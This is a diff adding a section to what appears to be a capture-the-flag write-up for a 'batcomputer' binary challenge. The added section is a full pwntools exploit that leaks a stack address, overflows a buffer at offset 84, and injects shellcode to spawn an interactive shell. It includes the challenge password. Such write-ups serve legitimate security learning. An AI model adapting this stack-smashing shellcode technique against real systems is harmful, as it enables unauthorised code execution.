@@ -440,6 +440,89 @@ Welcome to your BatComputer, Batman. What would you like to do?
 [*] Closed connection to 138.68.164.196 port 32194
 ```
 
+But if you want a shell here's the script for it 
+
+```
+from pwn import *
+
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+
+# Find offset to EIP/RIP for buffer overflows
+def find_ip(payload):
+    # Launch process and send payload
+    p = process(exe)
+    p.sendlineafter(b'>', '2')
+    p.sendlineafter(b"Ok. Let's do this. Enter the password:", 'b4tp@$$w0rd!')
+    p.sendlineafter(b"Enter the navigation commands:", payload)
+    p.sendlineafter(b'>', '420') 
+    # Wait for the process to crash
+    p.wait()
+    # Print out the address of EIP/RIP at the time of crashing
+    # ip_offset = cyclic_find(p.corefile.pc)  # x86
+    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
+    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
+    return ip_offset
+
+# Binary filename
+exe = './batcomputer'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = 'info'
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Lib-C library, can use pwninit/patchelf to patch binary
+# libc = ELF("./libc.so.6")
+# ld = ELF("./ld-2.27.so")
+
+# Pass in pattern_size, get back EIP/RIP offset
+#offset = find_ip(cyclic(100))
+offset = 84
+
+# Start program
+io = start()
+
+io.sendlineafter(b'>', '1')
+print(io.recvuntil('It was very hard, but Alfred managed to locate him: '))
+leak = io.recvline()
+find_addr = leak.find(b'0x')
+addr = leak[find_addr:].strip()
+stack_addr = int(addr, 16)
+print("Stack address found: " + hex(stack_addr))
+
+shellcode = asm(shellcraft.popad())
+shellcode += asm(shellcraft.sh())
+padding = asm('nop') * (offset - len(shellcode))
+ 
+# Build the payload
+payload = flat([
+    padding,
+    shellcode,
+    stack_addr
+])
+
+# Send the payload
+io.sendlineafter(b'>', '2')
+io.sendlineafter(b"Ok. Let's do this. Enter the password:", 'b4tp@$$w0rd!')
+io.sendlineafter(b"Enter the navigation commands:", payload)
+io.sendlineafter(b'>', '420') 
+
+# Got Shell?
+io.interactive()
+```
+
 And we're done 
 
 <br> <br> 
